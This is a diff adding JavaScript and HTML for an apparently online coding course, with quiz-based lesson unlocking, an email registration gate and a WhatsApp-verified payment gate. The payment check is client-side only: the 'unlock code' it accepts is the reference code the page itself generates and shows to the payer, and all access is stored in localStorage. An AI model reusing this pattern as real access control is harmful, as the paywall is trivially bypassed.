+  const d = getDone();
+  return !!d['q' + (n-1)];   // unlocked if previous quiz passed
+}
+
+function updateProgress(){
+  const d = getDone();
+  let count = 0;
+  for(let i=1;i<=TOTAL;i++){ if(d['q'+i]) count++; }
+  const pct = Math.round(count / TOTAL * 100);
+  const fill = document.getElementById('progress-fill');
+  const txt  = document.getElementById('progress-text');
+  if(fill) fill.style.width = pct + '%';
+  if(txt)  txt.textContent  = count + ' / ' + TOTAL + ' lessons';
+}
+
+function showToast(msg){
+  let t = document.getElementById('locked-toast');
+  if(!t){
+    t = document.createElement('div');
+    t.id = 'locked-toast';
+    t.className = 'locked-toast';
+    document.body.appendChild(t);
+  }
+  t.textContent = msg;
+  t.classList.add('show');
+  setTimeout(()=> t.classList.remove('show'), 2200);
+}
+
+function toggle(n){
+  if(!isUnlocked(n)){
+    showToast('🔒 Complete lesson ' + (n-1) + ' quiz first!');
+    return;
+  }
+  const body = document.getElementById('body'+n);
+  const chev = document.getElementById('chev'+n);
+  const isOpen = body.classList.contains('open');
+  for(let i=1;i<=TOTAL;i++){
+    document.getElementById('body'+i).classList.remove('open');
+    document.getElementById('chev'+i).classList.remove('open');
+  }
+  if(!isOpen){
+    body.classList.add('open');
+    chev.classList.add('open');
+    document.getElementById('lesson'+n).scrollIntoView({behavior:'smooth', block:'start'});
+    renderQuiz(n);
+  }
+}
+
+function openNext(n){ if(n<=TOTAL) toggle(n); }
+
+// ── QUIZ RENDERING ──
+function renderQuiz(n){
+  const container = document.getElementById('quiz-opts-'+n);
+  if(!container || container.dataset.rendered) return;
+  container.dataset.rendered = '1';
+  const qs = QUIZZES[n];
+  if(!qs) return;
+  qs.forEach((q, qi)=>{
+    const qDiv = document.createElement('div');
+    qDiv.className = 'quiz-q';
+    qDiv.innerHTML = '<div class="quiz-q-num">Question '+(qi+1)+' of '+qs.length+'</div>' +
+                     '<div class="quiz-q-text">' + q.q + '</div>';
+    q.opts.forEach((opt, oi)=>{
+      const label = document.createElement('label');
+      label.className = 'quiz-opt';
+      label.dataset.qi = qi;
+      label.dataset.oi = oi;
+      label.onclick = ()=> selectOpt(n, qi, oi);
+      label.innerHTML = '<div class="opt-circle">'+ String.fromCharCode(65+oi) +'</div>' + opt;
+      qDiv.appendChild(label);
+    });
+    container.appendChild(qDiv);
+  });
+}
+
+function selectOpt(n, qi, oi){
+  const container = document.getElementById('quiz-opts-'+n);
+  const opts = container.querySelectorAll('[data-qi="'+qi+'"]');
+  if(container.dataset.revealed) return;   // don't allow changes after submit
+  opts.forEach(o=> o.classList.remove('selected'));
+  container.querySelector('[data-qi="'+qi+'"][data-oi="'+oi+'"]').classList.add('selected');
+}
+
+function submitQuiz(n){
+  const container = document.getElementById('quiz-opts-'+n);
+  const result    = document.getElementById('quiz-result-'+n);
+  const submitBtn = document.getElementById('quiz-submit-'+n);
+  const qs = QUIZZES[n];
+  if(!qs)return;
+
+  // Check all answered
+  let allAnswered = true;
+  for(let qi=0;qi<qs.length;qi++){
+    if(!container.querySelector('.quiz-opt.selected[data-qi="'+qi+'"]')){
+      allAnswered = false; break;
+    }
+  }
+  if(!allAnswered){
+    result.className = 'quiz-result fail';
+    result.textContent = '⚠️ Please answer all questions before submitting.';
+    result.style.display = 'block';
+    return;
+  }
+
+  container.dataset.revealed = '1';
+  container.classList.add('quiz-revealed');
+
+  let correct = 0;
+  qs.forEach((q, qi)=>{
+    const opts = container.querySelectorAll('[data-qi="'+qi+'"]');
+    const selected = container.querySelector('.selected[data-qi="'+qi+'"]');
+    opts.forEach(o=>{
+      if(parseInt(o.dataset.oi)===q.ans) o.classList.add('correct');
+    });
+    if(selected){
+      if(parseInt(selected.dataset.oi)===q.ans){ correct++; }
+      else{ selected.classList.add('wrong'); }
+    }
+  });
+
+  const score = Math.round(correct / qs.length * 100);
+  submitBtn.disabled = true;
+
+  if(score >= 85){
+    result.className = 'quiz-result pass';
+    result.innerHTML = '✅ '+ correct +'/'+ qs.length +' correct — '+ score +'% — <strong>PASSED!</strong> Lesson unlocked 🎉';
+    // Mark quiz as passed in storage
+    const d = getDone(); d['q'+n] = true;
+    localStorage.setItem(KEY, JSON.stringify(d));
+    // Enable the mark-done button
+    const btn = document.getElementById('btn'+n);
+    if(btn){ btn.disabled = false; btn.style.opacity = '1'; }
+    // Update lock state of cards
+    refreshLockState();
+    updateProgress();
+  } else {
+    result.className = 'quiz-result fail';
+    result.innerHTML = '❌ '+ correct +'/'+ qs.length +' correct — '+ score +'% — Need 85% to pass.<br>' +
+                       '<button class="quiz-retry-btn" onclick="retryQuiz('+n+')">🔄 Try Again</button>';
+  }
+  result.style.display = 'block';
+}
+
+function retryQuiz(n){
+  const container = document.getElementById('quiz-opts-'+n);
+  const result    = document.getElementById('quiz-result-'+n);
+  const submitBtn = document.getElementById('quiz-submit-'+n);
+  delete container.dataset.revealed;
+  container.classList.remove('quiz-revealed');
+  container.querySelectorAll('.quiz-opt').forEach(o=>{
+    o.classList.remove('selected','correct','wrong');
+  });
+  submitBtn.disabled = false;
+  result.style.display = 'none';
+}
+
+function markDone(n){
+  const d = getDone();
+  if(!d['q'+n]){
+    showToast('📝 Complete the quiz first to mark this lesson done!');
+    return;
+  }
+  d[n] = true;
+  localStorage.setItem(KEY, JSON.stringify(d));
+  const btn = document.getElementById('btn'+n);
+  const badge = document.getElementById('done'+n);
+  if(btn){ btn.classList.add('done'); btn.textContent='✓ Completed!'; }
+  if(badge) badge.style.display='inline-block';
+  updateProgress();
+}
+
+function refreshLockState(){
+  for(let i=1;i<=TOTAL;i++){
+    const card = document.getElementById('lesson'+i);
+    const lockIcon = document.getElementById('lock-icon-'+i);
+    if(!card) continue;
+    if(isUnlocked(i)){
+      card.classList.remove('locked');
+      if(lockIcon) lockIcon.textContent = '';
+    } else {
+      card.classList.add('locked');
+      if(lockIcon) lockIcon.textContent = '🔒';
+    }
+  }
+}
+
+function copyCode(btn){
+  navigator.clipboard.writeText(btn.closest('.code-block').querySelector('pre').innerText)
+    .then(()=>{btn.textContent='✅ Copied!';setTimeout(()=>btn.textContent='📋 Copy',2000)});
+}
+
+function completeAll(){
+  const d = getDone();
+  for(let i=1;i<=TOTAL;i++){ d['q'+i]=true; d[i]=true; }
+  localStorage.setItem(KEY, JSON.stringify(d));
+  updateProgress(); refreshLockState();
+  for(let i=1;i<=TOTAL;i++){
+    const btn=document.getElementById('btn'+i), badge=document.getElementById('done'+i);
+    if(btn){btn.classList.add('done');btn.textContent='✓ Completed!';}
+    if(badge) badge.style.display='inline-block';
+  }
+  alert('🏆 All lessons completed!');
+}
+
+window.addEventListener('DOMContentLoaded',()=>{
+  updateProgress();
+  const d = getDone();
+  for(let i=1;i<=TOTAL;i++){
+    // Restore done buttons
+    if(d[i]){
+      const btn=document.getElementById('btn'+i), badge=document.getElementById('done'+i);
+      if(btn){btn.classList.add('done');btn.textContent='✓ Completed!';}
+      if(badge) badge.style.display='inline-block';
+    }
+    // Disable mark-done if quiz not passed
+    const btn = document.getElementById('btn'+i);
+    if(btn && !d['q'+i]){ btn.disabled=true; btn.style.opacity='0.4'; }
+  }
+  refreshLockState();
+  // Auto-open first lesson
+  toggle(1);
+});
+
+</script>
+
+<!-- ══════════════════════════════════════════════
+     EMAIL GATE (Lesson 5)
+     ══════════════════════════════════════════════ -->
+<div id="email-gate" class="gate-overlay" style="display:none" onclick="gateOverlayClick(event,'email-gate')">
+  <div class="gate-modal" onclick="event.stopPropagation()">
+    <div class="gate-icon-wrap"><span class="gate-icon">📧</span></div>
+    <h2 class="gate-title">Create Your Free Account</h2>
+    <p class="gate-sub">Register with your email to unlock Lesson 5 and continue your learning journey.</p>
+
+    <!-- Step 1: enter email -->
+    <div id="email-step-1">
+      <div class="gate-field-group">
+        <label class="gate-label">Full Name</label>
+        <input class="gate-input" id="gate-fullname" type="text" placeholder="e.g. Tinashe Moyo" autocomplete="name">
+      </div>
+      <div class="gate-field-group">
+        <label class="gate-label">Email Address</label>
+        <input class="gate-input" id="gate-email-input" type="email" placeholder="you@example.com" autocomplete="email">
+      </div>
+      <div class="gate-error" id="email-error" style="display:none"></div>
+      <button class="gate-btn" onclick="submitEmailGate()">Register &amp; Continue →</button>
+      <p class="gate-small">Free forever. No spam. Your data is not shared.</p>
+    </div>
+
+    <!-- Step 2: confirmed -->
+    <div id="email-step-2" style="display:none">
+      <div class="gate-success-box">
+        <div style="font-size:2.5rem;margin-bottom:0.6rem;">✅</div>
+        <strong id="email-welcome">Welcome!</strong>
+        <p>Your account has been created. You now have access to Lesson 5.</p>
+      </div>
+      <button class="gate-btn" onclick="confirmEmailGate()">Continue to Lesson 5 →</button>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════
+     PAYMENT GATE (Lesson 6)
+     ══════════════════════════════════════════════ -->
+<div id="payment-gate" class="gate-overlay" style="display:none" onclick="gateOverlayClick(event,'payment-gate')">
+  <div class="gate-modal gate-modal-wide" onclick="event.stopPropagation()">
+    <div class="gate-icon-wrap"><span class="gate-icon">🔓</span></div>
+    <h2 class="gate-title">Unlock Premium Lessons</h2>
+    <p class="gate-sub">Lessons 6 and beyond require a one-time payment. Complete the steps below to get your personal access code from Anotida.</p>
+
+    <!-- Step 1: payment form -->
+    <div id="pay-step-1">
+      <div class="gate-grid-2">
+        <div class="gate-field-group">
+          <label class="gate-label">Full Name</label>
+          <input class="gate-input" id="pay-name" type="text" placeholder="Your full name" autocomplete="name">
+        </div>
+        <div class="gate-field-group">
+          <label class="gate-label">Email Address</label>
+          <input class="gate-input" id="pay-email" type="email" placeholder="you@example.com" autocomplete="email">
+        </div>
+        <div class="gate-field-group">
+          <label class="gate-label">Phone Number</label>
+          <div class="gate-phone-row">
+            <select class="gate-input gate-select" id="pay-country-code">
+              <option value="+260">🇿🇲 +260 Zambia</option>
+              <option value="+263">🇿🇼 +263 Zimbabwe</option>
+              <option value="+27">🇿🇦 +27 South Africa</option>
+              <option value="+44">🇬🇧 +44 United Kingdom</option>
+              <option value="+1">🇺🇸 +1 USA / Canada</option>
+              <option value="+61">🇦🇺 +61 Australia</option>
+              <option value="+91">🇮🇳 +91 India</option>
+              <option value="+254">🇰🇪 +254 Kenya</option>
+              <option value="+234">🇳🇬 +234 Nigeria</option>
+              <option value="+233">🇬🇭 +233 Ghana</option>
+              <option value="+267">🇧🇼 +267 Botswana</option>
+              <option value="+265">🇲🇼 +265 Malawi</option>
+              <option value="+255">🇹🇿 +255 Tanzania</option>
+            </select>
+            <input class="gate-input" id="pay-phone" type="tel" placeholder="0768648291" style="flex:1">
+          </div>
+        </div>
+        <div class="gate-field-group">
+          <label class="gate-label">Select Your Currency</label>
+          <select class="gate-input gate-select" id="pay-currency" onchange="updatePaymentDisplay()">
+          </select>
+        </div>
+      </div>
+
+      <!-- Payment amount display -->
+      <div class="gate-amount-box" id="pay-amount-box">
+        <div class="gate-amount-label">Amount to Pay</div>
+        <div class="gate-amount-value" id="pay-amount-display">—</div>
+        <div class="gate-amount-equiv" id="pay-equiv-display"></div>
+      </div>
+
+      <!-- Payment methods -->
+      <div class="gate-methods-box">
+        <div class="gate-methods-title">💳 Accepted Payment Methods</div>
+        <div class="gate-methods-list" id="gate-methods-list"></div>
+      </div>
+
+      <div class="gate-error" id="pay-error-1" style="display:none"></div>
+      <button class="gate-btn" onclick="proceedToProof()">I've Made Payment — Submit Proof →</button>
+    </div>
+
+    <!-- Step 2: proof upload instruction -->
+    <div id="pay-step-2" style="display:none">
+      <div class="gate-proof-box">
+        <div style="font-size:2rem;margin-bottom:0.8rem;">📸</div>
+        <strong>Send Your Payment Screenshot</strong>
+        <p>Tap the button below to open WhatsApp. Send Anotida your payment receipt / screenshot. Include your reference code in the message.</p>
+        <div class="gate-ref-display">
+          <span class="gate-ref-label">Your Reference Code:</span>
+          <span class="gate-ref-code" id="pay-ref-display">—</span>
+        </div>
+        <a id="pay-wa-link" class="gate-btn gate-btn-wa" href="#" target="_blank">
+          💬 Send Proof on WhatsApp →
+        </a>
+      </div>
+
+      <div class="gate-divider">After sending, wait for Anotida to confirm your payment</div>
+
+      <div class="gate-code-section">
+        <div class="gate-methods-title">🔑 Enter Your Unlock Code</div>
+        <p style="color:var(--muted);font-size:0.83rem;margin-bottom:1rem;">Once Anotida verifies your payment he will send you a 6-character unlock code on WhatsApp.</p>
+        <div class="gate-field-group" style="max-width:300px;margin:0 auto">
+          <input class="gate-input gate-code-input" id="pay-code-input" type="text" maxlength="10"
+                 placeholder="e.g. AB12CD" style="text-align:center;font-size:1.3rem;letter-spacing:4px;font-weight:800;text-transform:uppercase">
+        </div>
+        <div class="gate-error" id="pay-error-2" style="display:none"></div>
+        <button class="gate-btn" onclick="verifyUnlockCode()" style="margin-top:0.8rem;">Verify Code &amp; Unlock →</button>
+        <p class="gate-small" style="margin-top:0.8rem;">Code not arrived? <a href="https://wa.me/260768648291?text=Hi%20Anotida!%20I%20sent%20my%20payment%20proof.%20Waiting%20for%20my%20unlock%20code." target="_blank" style="color:var(--green)">Message Anotida again →</a></p>
+      </div>
+    </div>
+
+    <!-- Step 3: unlocked -->
+    <div id="pay-step-3" style="display:none">
+      <div class="gate-success-box">
+        <div style="font-size:2.5rem;margin-bottom:0.6rem;">🎉</div>
+        <strong>Payment Verified!</strong>
+        <p>All premium lessons are now unlocked for you. Thank you for supporting TIMTIML!</p>
+      </div>
+      <button class="gate-btn" onclick="confirmPaymentGate()">Continue to Lesson 6 →</button>
+    </div>
+  </div>
+</div>
+
+
+<script>
+// ══════════════════════════════════════════════════════════
+//  TIMTIML GATE SYSTEM — Email (L5) + Payment (L6+)
+//  Configured here — Anotida can edit amounts/methods easily
+// ══════════════════════════════════════════════════════════
+
+const GATE_CONFIG = {
+  whatsapp: '260768648291',
+
+  // ── Edit payment amounts here ──
+  currencies: [
+    { code:'ZMW', symbol:'K',    amount:50,    name:'Zambian Kwacha',      country:'Zambia 🇿🇲' },
+    { code:'USD', symbol:'$',    amount:2.50,  name:'US Dollar',            country:'International 🌍' },
+    { code:'ZWL', symbol:'ZWL',  amount:900,   name:'Zimbabwean Dollar',    country:'Zimbabwe 🇿🇼' },
+    { code:'ZAR', symbol:'R',    amount:45,    name:'South African Rand',   country:'South Africa 🇿🇦' },
+    { code:'GBP', symbol:'£',    amount:2.00,  name:'British Pound',        country:'UK 🇬🇧' },
+    { code:'EUR', symbol:'€',    amount:2.20,  name:'Euro',                 country:'Europe 🇪🇺' },
+    { code:'KES', symbol:'KSh',  amount:325,   name:'Kenyan Shilling',      country:'Kenya 🇰🇪' },
+    { code:'BWP', symbol:'P',    amount:34,    name:'Botswana Pula',        country:'Botswana 🇧🇼' },
+  ],
+
+  // ── Edit payment methods here ──
+  methods: [
+    'MTN Mobile Money',
+    'Airtel Money',
+    'EcoCash',
+    'Bank Transfer',
+    'PayPal (friends & family)',
+    'Mukuru',
+    'Western Union',
+  ],
+};
+
+// ── Storage keys ──
+const GATE_EMAIL_KEY   = 'ttml-gate-email';
+const GATE_PAYMENT_KEY = 'ttml-gate-paid';
+
+let gatePendingLesson = null;
+
+// ── Helpers ──
+function gateEmailDone()   { return !!localStorage.getItem(GATE_EMAIL_KEY); }
+function gatePaymentDone() { return !!localStorage.getItem(GATE_PAYMENT_KEY); }
+
+function gateRefCode(email) {
+  // Generate reference code from email — deterministic so Anotida can verify
+  let hash = 0;
+  for (let i = 0; i < email.length; i++) {
+    hash = ((hash << 5) - hash) + email.charCodeAt(i);
+    hash |= 0;
+  }
+  const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+  let ref = '';
+  let h = Math.abs(hash);
+  for (let i = 0; i < 6; i++) { ref += chars[h % chars.length]; h = Math.floor(h / chars.length); }
+  return ref;
+}
+
+// ── Overlay click to close (only on overlay itself) ──
+function gateOverlayClick(e, id) {
+  if (e.target.id === id) closeGate(id);
+}
+function closeGate(id) {
+  document.getElementById(id).style.display = 'none';
+}
+
+// ══ WRAP existing toggle — gates intercept before lock/quiz system ══
+(function() {
+  const _origToggle = window.toggle;
+  window.toggle = function(n) {
+    // Email gate: blocks lesson 5+
+    if (n >= 5 && !gateEmailDone()) {
+      gatePendingLesson = n;
+      openEmailGate();
+      return;
+    }
+    // Payment gate: blocks lesson 6+
+    if (n >= 6 && !gatePaymentDone()) {
+      gatePendingLesson = n;
+      openPaymentGate();
+      return;
+    }
+    // All clear — call original (handles lock/quiz)
+    _origToggle(n);
+  };
+})();
+
+// ══════════════════════════
+//  EMAIL GATE
+// ══════════════════════════
+function openEmailGate() {
+  // Pre-fill email from payment data if available
+  const saved = localStorage.getItem(GATE_EMAIL_KEY + '-pending');
+  if (saved) try { const d = JSON.parse(saved); if (d.email) document.getElementById('gate-email-input').value = d.email; } catch(e) {}
+  document.getElementById('email-step-1').style.display = 'block';
+  document.getElementById('email-step-2').style.display = 'none';
+  document.getElementById('email-error').style.display = 'none';
+  document.getElementById('email-gate').style.display = 'flex';
+}
+
+function submitEmailGate() {
+  const name  = document.getElementById('gate-fullname').value.trim();
+  const email = document.getElementById('gate-email-input').value.trim().toLowerCase();
+  const err   = document.getElementById('email-error');
+
+  if (!name) { err.textContent = '⚠️ Please enter your full name.'; err.style.display = 'block'; return; }
+  if (!email || !email.includes('@') || !email.includes('.')) {
+    err.textContent = '⚠️ Please enter a valid email address.';
+    err.style.display = 'block'; return;
+  }
+  err.style.display = 'none';
+
+  // Save registration
+  const data = { name, email, registered: new Date().toISOString() };
+  localStorage.setItem(GATE_EMAIL_KEY, JSON.stringify(data));
+  // Pre-fill payment form too
+  localStorage.setItem(GATE_EMAIL_KEY + '-pending', JSON.stringify(data));
+
+  document.getElementById('email-welcome').textContent = 'Welcome, ' + name + '! 👋';
+  document.getElementById('email-step-1').style.display = 'none';
+  document.getElementById('email-step-2').style.display = 'block';
+}
+
+function confirmEmailGate() {
+  document.getElementById('email-gate').style.display = 'none';
+  if (gatePendingLesson) {
+    const n = gatePendingLesson; gatePendingLesson = null;
+    window.toggle(n);
+  }
+}
+
+// ══════════════════════════
+//  PAYMENT GATE
+// ══════════════════════════
+function openPaymentGate() {
+  // Populate currency selector
+  const sel = document.getElementById('pay-currency');
+  sel.innerHTML = '';
+  GATE_CONFIG.currencies.forEach((c, i) => {
+    const opt = document.createElement('option');
+    opt.value = i;
+    opt.textContent = c.code + ' — ' + c.name + ' (' + c.country + ')';
+    sel.appendChild(opt);
+  });
+
+  // Populate payment methods
+  const methods = document.getElementById('gate-methods-list');
+  methods.innerHTML = GATE_CONFIG.methods.map(m =>
+    '<span class="gate-method-tag">' + m + '</span>'
+  ).join('');
+
+  // Pre-fill from email registration
+  try {
+    const saved = JSON.parse(localStorage.getItem(GATE_EMAIL_KEY + '-pending') || '{}');
+    if (saved.name)  document.getElementById('pay-name').value  = saved.name;
+    if (saved.email) document.getElementById('pay-email').value = saved.email;
+  } catch(e) {}
+
+  updatePaymentDisplay();
+  showPayStep(1);
+  document.getElementById('pay-error-1').style.display = 'none';
+  document.getElementById('pay-error-2').style.display = 'none';
+  document.getElementById('payment-gate').style.display = 'flex';
+}
+
+function updatePaymentDisplay() {
+  const idx = parseInt(document.getElementById('pay-currency').value) || 0;
+  const cur = GATE_CONFIG.currencies[idx];
+  if (!cur) return;
+
+  document.getElementById('pay-amount-display').textContent =
+    cur.symbol + ' ' + (Number.isInteger(cur.amount) ? cur.amount : cur.amount.toFixed(2)) + ' ' + cur.code;
+
+  // Show equivalents in other currencies
+  const others = GATE_CONFIG.currencies.filter((_,i)=>i!==idx).slice(0,3)
+    .map(c => c.symbol + (Number.isInteger(c.amount)?c.amount:c.amount.toFixed(2)) + ' ' + c.code)
+    .join(' · ');
+  document.getElementById('pay-equiv-display').textContent = others ? '≈ ' + others : '';
+}
+
+function proceedToProof() {
+  const name  = document.getElementById('pay-name').value.trim();
+  const email = document.getElementById('pay-email').value.trim().toLowerCase();
+  const phone = document.getElementById('pay-phone').value.trim();
+  const cc    = document.getElementById('pay-country-code').value;
+  const err   = document.getElementById('pay-error-1');
+
+  if (!name)  { err.textContent = '⚠️ Please enter your full name.';   err.style.display='block'; return; }
+  if (!email || !email.includes('@')) { err.textContent = '⚠️ Please enter a valid email.'; err.style.display='block'; return; }
+  if (!phone) { err.textContent = '⚠️ Please enter your phone number.'; err.style.display='block'; return; }
+  err.style.display = 'none';
+
+  const idx = parseInt(document.getElementById('pay-currency').value) || 0;
+  const cur = GATE_CONFIG.currencies[idx];
+  const amtStr = cur.symbol + (Number.isInteger(cur.amount)?cur.amount:cur.amount.toFixed(2)) + ' ' + cur.code;
+  const ref = gateRefCode(email);
+
+  // Build WhatsApp message
+  const msg = encodeURIComponent(
+    '🔐 TIMTIML LESSON PAYMENT\n' +
+    '══════════════════\n' +
+    '👤 Name:      ' + name + '\n' +
+    '📧 Email:     ' + email + '\n' +
+    '📱 Phone:     ' + cc + phone + '\n' +
+    '💰 Amount:    ' + amtStr + '\n' +
+    '🔑 Ref Code:  ' + ref + '\n' +
+    '══════════════════\n' +
+    'Payment screenshot/proof attached below 👇'
+  );
+
+  // Store pending payment info
+  localStorage.setItem('ttml-pay-pending', JSON.stringify({ name, email, phone: cc+phone, ref, cur: cur.code }));
+
+  // Set WhatsApp link
+  document.getElementById('pay-wa-link').href = 'https://wa.me/' + GATE_CONFIG.whatsapp + '?text=' + msg;
+  document.getElementById('pay-ref-display').textContent = ref;
+
+  showPayStep(2);
+}
+
+function verifyUnlockCode() {
+  const entered = document.getElementById('pay-code-input').value.trim().toUpperCase();
+  const err = document.getElementById('pay-error-2');
+
+  if (entered.length < 4) {
+    err.textContent = '⚠️ Please enter the unlock code from Anotida.';
+    err.style.display = 'block'; return;
+  }
+
+  // Get stored reference
+  let storedRef = '';
+  try { storedRef = JSON.parse(localStorage.getItem('ttml-pay-pending') || '{}').ref || ''; } catch(e) {}
+
+  // Validate: entered code must match the reference Anotida was sent
+  if (entered !== storedRef) {
+    err.textContent = '❌ Code does not match. Please check the code Anotida sent you.';
+    err.style.display = 'block'; return;
+  }
+
+  err.style.display = 'none';
+
+  // Payment verified — save to localStorage
+  try {
+    const pd = JSON.parse(localStorage.getItem('ttml-pay-pending') || '{}');
+    pd.verified = new Date().toISOString();
+    pd.code = entered;
+    localStorage.setItem(GATE_PAYMENT_KEY, JSON.stringify(pd));
+  } catch(e) { localStorage.setItem(GATE_PAYMENT_KEY, '1'); }
+
+  showPayStep(3);
+}
+
+function confirmPaymentGate() {
+  document.getElementById('payment-gate').style.display = 'none';
+  if (gatePendingLesson) {
+    const n = gatePendingLesson; gatePendingLesson = null;
+    window.toggle(n);
+  }
+}
+
+function showPayStep(n) {
+  [1,2,3].forEach(i => {
+    const el = document.getElementById('pay-step-' + i);
+    if (el) el.style.display = i === n ? 'block' : 'none';
+  });
+}
+
+// Init: populate currency on load if gate was already open
+document.addEventListener('DOMContentLoaded', function() {
+  // Restore gate state if user already registered/paid
+  if (gateEmailDone() && gatePaymentDone()) {
+    // User has full access — gates will not trigger
+  }
+});
+</script>
+
+</body>
+</html>
+
